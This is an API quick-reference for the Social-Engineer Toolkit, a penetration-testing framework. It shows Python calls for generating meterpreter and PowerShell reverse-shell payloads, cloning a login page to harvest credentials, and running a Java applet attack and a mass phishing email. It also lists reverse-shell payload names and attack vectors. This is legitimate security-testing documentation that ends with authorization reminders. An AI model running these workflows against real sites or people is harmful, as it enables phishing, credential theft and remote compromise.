# SET API Quick Reference Guide

## Most Commonly Used Functions

### Import Core Module
```python
from src.core.setcore import *
```

### IP Address Management
```python
# Auto-detect public IP
ip = detect_public_ip()

# Validate IP address
if validate_ip("192.168.1.1"):
    print("Valid")

# Prompt for IP with validation
ip = grab_ipaddress()

# Set IP in configuration
update_options("IPADDR=192.168.1.100")
```

### User Interaction
```python
# Formatted prompts
user_input = input(setprompt(["1"], "Enter target URL"))

# Yes/No prompts
response = yesno_prompt(["1"], "Continue? [yes|no]")

# Status messages
print_status("Operation started")
print_info("Additional information")
print_warning("Warning message")
print_error("Error occurred")

# Pause for user
return_continue()
```

### Configuration
```python
# Read configuration
metasploit_path = check_config("METASPLOIT_PATH=")
auto_detect = check_config("AUTO_DETECT=")

# Set options
update_options("IPADDR=10.0.0.1")
update_options("PORT=443")
update_options("ATTACK_VECTOR=java")

# Check options
ip = check_options("IPADDR=")
port = check_options("PORT=")
```

### Random String Generation
```python
# Generate random filename
filename = generate_random_string(8, 12) + ".exe"

# Generate random alphanumeric string
random_id = generate_random_string(6, 10)
```

### Payload Generation
```python
# Generate shellcode
shellcode = metasploit_shellcode(
    "windows/meterpreter/reverse_tcp",
    "192.168.1.100",
    "443"
)

# Generate PowerShell payload
ps_payload = generate_powershell_alphanumeric_payload(
    "windows/meterpreter/reverse_https",
    "10.0.0.5",
    "443",
    ""
)
```

### Website Cloning
```python
# Clone a website
target_url = "https://example.com"
export_path = "/tmp/cloned"

site_cloner(target_url, export_path, "")
```

### Web Server
```python
# Start threaded web server
start_web_server("/path/to/directory")

# Start unthreaded (blocking)
start_web_server_unthreaded("/path/to/directory")
```

### Cleanup
```python
# Cleanup temporary files
cleanup_routine()

# Exit SET cleanly
exit_set()
```

## Common Attack Workflows

### Java Applet Attack
```python
# 1. Configure
update_options("IPADDR=192.168.1.100")
update_options("PORT=443")

# 2. Set site to clone
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\nURL=https://target.com\n")

# 3. Set attack vector
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("java")

# 4. Clone and inject
import src.webattack.web_clone.cloner

# 5. Generate payload
import src.core.payloadgen.create_payloads

# 6. Launch
from src.html import spawn
```

### Credential Harvester
```python
# 1. Configure IP
update_options("IPADDR=10.0.0.5")

# 2. Set target site
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\nURL=https://login.target.com\n")

# 3. Set harvester attack
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("harvester")

# 4. Clone and start harvester
import src.webattack.web_clone.cloner
import src.webattack.harvester.harvester
```

### Mass Email Attack
```python
# 1. Prepare email list (one per line)
# 2. Create payload
# 3. Import email module
import src.phishing.smtp.client.smtp_web
```

## File Paths

### Configuration Files
- Main config: `/etc/setoolkit/set.config`
- User config: `~/.set/` (stored in `userconfigpath` variable)
- Log file: `src/logs/set_logfile.log`

### Common Files in userconfigpath
- `site.template` - Website cloning configuration
- `attack_vector` - Attack type
- `msf.exe` - Generated payload
- `meta_config` - Metasploit listener configuration
- `set.options` - Session options
- `web_clone/` - Cloned website directory

## Quick Payload Reference

### Windows Payloads
- `windows/meterpreter/reverse_tcp`
- `windows/meterpreter/reverse_https`
- `windows/meterpreter/reverse_http`
- `windows/meterpreter/reverse_tcp_allports`
- `windows/shell/reverse_tcp`
- `windows/x64/meterpreter/reverse_tcp`

### Special SET Payloads
- `shellcode/alphanum` - Alphanumeric shellcode
- `shellcode/pyinject` - Python injector
- `shellcode/multipyinject` - Multi-payload injector
- `set/reverse_shell` - SET interactive shell
- `cmd/multi` - Multiple commands

## Attack Vectors

- `java` - Java Applet Attack
- `browser` - Browser Exploit
- `harvester` - Credential Harvester
- `tabnabbing` - Tab Nabbing
- `webjacking` - Web Jacking
- `multiattack` - Multiple attacks
- `hta` - HTA Attack
- `profiler` - Web Profiler

## Common Errors and Solutions

### "Metasploit not found"
```python
# Configure in /etc/setoolkit/set.config
METASPLOIT_PATH=/usr/bin/
```

### "Not running as root"
```bash
sudo ./setoolkit
```

### "Website cloning failed"
- Check internet connection
- Verify target URL is accessible
- Check if site blocks wget/scrapers

### "Port already in use"
```python
kill_proc("80", "python")
```

## Environment Variables

```python
# Main SET path
definepath = definepath()

# User config path
userconfig = userconfigpath  # ~/.set/

# Operating system
os_type = check_os()  # "posix" or "windows"

# Metasploit path
msf = meta_path()
```

## Security Reminders

1. **Always** obtain proper authorization
2. **Always** stay within scope
3. **Always** document activities
4. **Always** cleanup after testing
5. **Never** use for illegal purposes

## Support

- GitHub: https://github.com/trustedsec/social-engineer-toolkit
- Issues: https://github.com/trustedsec/social-engineer-toolkit/issues
- Website: https://www.trustedsec.com

---

*For full documentation, see API_DOCUMENTATION.md*
